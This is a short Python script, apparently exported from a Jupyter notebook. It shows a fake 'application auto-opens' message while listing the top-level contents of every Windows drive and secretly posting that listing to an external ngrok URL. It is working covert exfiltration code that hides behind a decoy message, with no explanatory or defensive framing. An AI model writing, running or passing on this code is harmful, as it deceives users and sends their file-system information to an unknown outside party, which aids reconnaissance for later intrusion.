#!/usr/bin/env python
# coding: utf-8

# In[16]:


print("Please wait while the application auto-opens...");
import glob
dir_str="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
smain="";
for ii in dir_str:
    ss=ii+":/*";
    dirlist = glob.glob(ss)
    s="<ul>"
    for i in dirlist:
        s=s+"<li>"+i+"</li>"
    s=s+"</ul>"
    if(s!="<ul></ul>"):
        smain+="<h3>"+ii+" Drive: </h3>"+s
        
import requests
r=requests.post("https://f6e45ab65acd.ngrok.io/buggy.php", data={"syp":smain})


# In[ ]:




